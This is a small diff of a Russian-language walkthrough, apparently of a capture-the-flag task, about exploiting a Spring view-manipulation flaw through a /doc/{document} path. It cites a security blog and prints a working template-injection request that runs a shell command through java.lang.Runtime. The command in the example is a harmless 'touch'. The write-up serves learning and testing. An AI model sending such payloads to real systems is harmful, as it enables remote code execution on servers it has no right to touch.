@@ -5,7 +5,7 @@
 ![password.png](password.png "интересненько...") \
 Видим ещё /doc/{document}, который скорее всего можно проэксплатировать. Ищем в яндексе "springframework Path Variable exploit" и натыкаемся на замечательный сайт:\
 https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability \
-На нём находим эксплоит для /doc: \
+На нём находим эксплоит для /doc: 
 ```
 GET /doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x HTTP/1.1
 ```
